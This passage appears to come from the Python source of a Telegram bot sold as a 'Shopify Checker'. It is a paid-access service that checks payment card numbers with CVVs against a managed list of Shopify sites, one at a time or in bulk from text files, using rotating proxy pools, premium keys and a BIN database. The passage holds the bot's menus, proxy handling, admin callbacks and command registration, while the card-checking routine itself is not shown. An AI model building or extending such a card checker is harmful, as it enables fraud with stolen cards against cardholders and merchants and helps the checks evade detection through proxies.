        except:
            failed += 1

    await status_msg.edit(pe(
        f"📡 <b>Broadcast Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"✅ <b>Delivered:</b>  {sent}\n"
        f"❌ <b>Failed:</b>     {failed}\n"
        f"📋 <b>Total:</b>      {len(all_targets)}"
    ), parse_mode='html')

# =============== CALLBACK HANDLERS (gates, proxy, etc.) ===============
@bot.on(events.CallbackQuery(pattern=b"gates"))
async def cb_gates(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    text = pe(
        f"<b>💳 Shopify Checker</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"⚡ <b>Single Check</b>\n"
        f"<code>/sh card|mm|yy|cvv</code>\n\n"
        f"⚡ <b>Mass Check</b>\n"
        f"Reply to <code>.txt</code> with <code>/msh</code>\n"
        f"— or — send a <code>.txt</code> file directly"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_gates())

@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
async def cb_manage_proxy(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = (
        f"✅ <b>{len(user_list)} proxy(ies) active</b>  🔁 Rotating"
        if user_list else "❌ <b>No Personal Proxies Set</b>"
    )
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Set proxies:</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<code>/setproxy\nproxy1:port\nproxy2:port</code>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def cb_back_start(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    try:
        sender    = await bot.get_entity(uid)
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"

    lim = get_user_limit(uid)
    if is_admin(uid):
        status_icon = "👑"; status_line = "Admin"
    elif is_premium(uid):
        status_icon = "✅"; status_line = "Premium"
    else:
        status_icon = "🚫"; status_line = "No Access"

    text = pe(
        f"<b>⚡ Welcome, {firstname}!</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>User</b>     »  {username}\n"
        f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{status_icon} <b>Status</b>  »  {status_line}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Select an option below to get started.\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_main())

@bot.on(events.CallbackQuery(pattern=b"close"))
async def cb_close(event):
    await event.answer()
    try:
        await bot.delete_messages(event.chat_id, event.message_id)
    except:
        pass

@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
async def cb_stop_mass(event):
    uid = event.sender_id
    killed = 0
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_"):
            active_sessions.pop(k, None)
            killed += 1
    if killed:
        await event.answer("⛔ Mass check stopped!", alert=True)
        try:
            await raw_edit(event.chat_id, event.message_id,
                           pe(f"⛔ <b>Mass Check  —  Stopped</b>\n<b>{SEP}</b>\nCancelled by user."), [])
        except:
            pass
    else:
        await event.answer("No active session.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
async def cb_toggle_pool(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    current = user_pool_enabled.get(uid, True)
    user_pool_enabled[uid] = not current
    save_user_pool()
    state = "ON ✅" if not current else "OFF ⚡"
    await event.answer(f"Proxy Pool  →  {state}", alert=False)
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = (
        f"✅ <b>{len(user_list)} proxy(ies) active</b>  🔁 Rotating"
        if user_list else "❌ <b>No Personal Proxies Set</b>"
    )
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Set proxies:</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
async def cb_test_proxy_btn(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    user_list = get_user_proxy_list(uid)
    if not user_list:
        await event.answer("❌ No proxy set. Use /setproxy first.", alert=True)
        return
    proxy = user_list[0]
    await event.answer("⏳ Testing...", alert=False)
    r        = await test_proxy(proxy)
    is_alive = r.get('status') == 'alive'
    if is_alive:
        ip_info = await get_proxy_ip(proxy)
        await event.answer(f"✅ Alive  —  {ip_info or 'N/A'}", alert=True)
    else:
        await event.answer("❌ Proxy Dead", alert=True)

@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
async def cb_remove_proxy_btn(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    remove_user_proxy(uid)
    await event.answer("✅ Proxy removed!", alert=True)
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = (
        f"✅ <b>{len(user_list)} proxy(ies) active</b>  🔁 Rotating"
        if user_list else "❌ <b>No Personal Proxies Set</b>"
    )
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Set proxies:</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

# =============== ADMIN CALLBACKS ===============
@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def cb_admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())

@bot.on(events.CallbackQuery(pattern=b"admin_users"))
async def cb_admin_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    pcount = len(load_premium_users())
    text = pe(
        f"<b>👤 User Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"✅ <b>Access List</b>  »  {pcount} users"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())

@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def cb_admin_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    scount = len(load_sites())
    text = pe(
        f"<b>🌐 Site Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"🌐 <b>Active Sites</b>  »  {scount}"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Add:</b>    <code>/addsite https://example.com</code>\n"
        f"<b>Remove:</b> <code>/rmsite https://example.com</code>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())

@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
async def cb_admin_proxy_pool(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    prcount = len(load_proxies())
    text = pe(
        f"<b>📡 Proxy Pool</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"📡 <b>Pool Size</b>  »  {prcount} proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Add:</b>   <code>/addproxy ip:port</code>\n"
        f"<b>Clear:</b> <code>/clearproxy</code>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def cb_admin_broadcast_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    total = len(load_premium_users()) + len(ADMIN_IDS)
    text = pe(
        f"<b>📢 Broadcast</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"📋 <b>Reach</b>  »  ~{total} users"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Usage: <code>/broadcast Your message here</code>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text,
                   [[{"text": "↪️  Back", "callback_data": "admin_panel"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
async def cb_admin_list_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_premium_users()
    if not curr:
        await event.answer("📋 No users on the access list yet.", alert=True)
        return
    lines = "\n".join([f"  {i+1}. <code>{u}</code>" for i, u in enumerate(curr[:30])])
    extra = f"\n  <i>+{len(curr)-30} more...</i>" if len(curr) > 30 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>📋 Access List  ({len(curr)})</b>\n"
        f"<b>{SEP}</b>\n"
        f"{lines}{extra}"
    ), [[{"text": "↪️  Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_user_info"))
async def cb_admin_add_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>✅ Add User</b>\n"
        f"<b>{SEP}</b>\n"
        f"Usage: <code>/addpremium [user_id]</code>"
    ), [[{"text": "↪️  Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_user_info"))
async def cb_admin_rm_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>❌ Remove User</b>\n"
        f"<b>{SEP}</b>\n"
        f"Usage: <code>/rmpremium [user_id]</code>"
    ), [[{"text": "↪️  Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
async def cb_admin_list_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_sites()
    if not curr:
        await event.answer("🌐 No sites configured yet.", alert=True)
        return
    lines = "\n".join([f"  {i+1}. <code>{s}</code>" for i, s in enumerate(curr[:20])])
    extra = f"\n  <i>+{len(curr)-20} more...</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🌐 Sites  ({len(curr)})</b>\n"
        f"<b>{SEP}</b>\n"
        f"{lines}{extra}"
    ), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_site_info"))
async def cb_admin_add_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>✅ Add Site</b>\n"
        f"<b>{SEP}</b>\n"
        f"Usage: <code>/addsite https://example.com</code>"
    ), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_site_info"))
async def cb_admin_rm_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>❌ Remove Site</b>\n"
        f"<b>{SEP}</b>\n"
        f"Usage: <code>/rmsite https://example.com</code>"
    ), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
async def cb_admin_list_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_proxies()
    if not curr:
        await event.answer("📡 Proxy pool is empty.", alert=True)
        return
    lines = "\n".join([f"  {i+1}. <code>{p}</code>" for i, p in enumerate(curr[:20])])
    extra = f"\n  <i>+{len(curr)-20} more...</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>📡 Proxy Pool  ({len(curr)})</b>\n"
        f"<b>{SEP}</b>\n"
        f"{lines}{extra}"
    ), [[{"text": "↪️  Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_proxy_info"))
async def cb_admin_add_proxy_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>✅ Add Proxies</b>\n"
        f"<b>{SEP}</b>\n"
        f"<code>/addproxy ip:port</code>\n"
        f"<code>/addproxy ip:port:user:pass</code>\n"
        f"<b>Multiple:</b>\n"
        f"<code>/addproxy\nip:port\nip:port:user:pass</code>"
    ), [[{"text": "↪️  Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
async def cb_admin_clear_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_proxies()
    if not curr:
        await event.answer("Proxy pool is already empty.", alert=True)
        return
    with open(PROXY_FILE, 'w') as f:
        f.write("")
    await event.answer(f"✅ Cleared {len(curr)} proxies!", alert=True)
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())

@bot.on(events.CallbackQuery(pattern=b"noop"))
async def cb_noop(event):
    await event.answer()

# =============== REGISTER COMMANDS ===============
def _register_commands():
    user_cmds = [
        {"command": "start",          "description": "🚀 Open dashboard"},
        {"command": "sh",             "description": "⚡ Single check: /sh card|mm|yy|cvv"},
        {"command": "msh",            "description": "🔥 Mass check (reply to .txt)"},
        {"command": "myplan",         "description": "💎 Check your access level"},
        {"command": "redeem",         "description": "🔑 Redeem a premium key"},
        {"command": "addproxy",       "description": "📡 Add proxies (one per line)"},
        {"command": "proxy",          "description": "🔄 Check and clean your proxies"},
        {"command": "chkproxy",       "description": "✅ Test a single proxy"},
        {"command": "rmproxy",        "description": "❌ Remove a specific proxy"},
        {"command": "rmproxyindex",   "description": "🔢 Remove by index (e.g., 1,2,3)"},
        {"command": "clearproxy",     "description": "🗑️ Clear all your proxies"},
        {"command": "myproxy",        "description": "📋 View your proxies"},
        {"command": "getproxy",       "description": "📥 Download your proxy list"},
        {"command": "setproxy",       "description": "🔌 Set proxy: /setproxy ip:port[:user:pass]"},
        {"command": "clearuserproxy", "description": "🗑️ Remove your personal proxy"},
        {"command": "checkme",        "description": "🔍 Check membership status (admin)"},
    ]
    admin_cmds = user_cmds + [
        {"command": "admin",          "description": "👑 Admin panel"},
        {"command": "genkeys",        "description": "⭐ Generate keys: /genkeys amount hours user_limit [price]"},
        {"command": "addpremium",     "description": "✅ Add permanent premium: /addpremium user_id"},
        {"command": "removepremium",  "description": "❌ Remove premium: /removepremium user_id"},
        {"command": "listpremium",    "description": "📋 List premium users"},
        {"command": "addsite",        "description": "🌐 Add site: /addsite url"},
        {"command": "rmsite",         "description": "🗑️ Remove site: /rmsite url"},
        {"command": "addsites",       "description": "📁 Upload sites.txt"},
        {"command": "site",           "description": "🔍 Check and clean sites"},
        {"command": "getsites",       "description": "📥 Download sites.txt"},
        {"command": "broadcast",      "description": "📢 Broadcast: /broadcast message"},
        {"command": "setadmin",       "description": "👑 Manage admins: /setadmin add/rm id"},
        {"command": "clearproxy",     "description": "🗑️ Clear global proxy pool"},
    ]
    from keyboards import _http_session
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    try:
        _http_session.post(f"{base}/setMyCommands", json={"commands": user_cmds}, timeout=5)
        _http_session.post(f"{base}/setMyCommands", json={"commands": admin_cmds, "scope": {"type": "chat", "chat_id": OWNER_ID}}, timeout=5)
        for aid in ADMIN_IDS:
            if aid != OWNER_ID:
                _http_session.post(f"{base}/setMyCommands", json={"commands": admin_cmds, "scope": {"type": "chat", "chat_id": aid}}, timeout=5)
    except:
        pass

_register_commands()

# =============== BACKGROUND CLEANUP ===============
loop = asyncio.get_event_loop()
loop.create_task(cleanup_expired_premium())

# =============== START BOT ===============
_bin_count = load_bins()
print(f"✅ {BOT_BRAND} started successfully! (BIN DB: {_bin_count:,} entries)")
bot.run_until_disconnected()
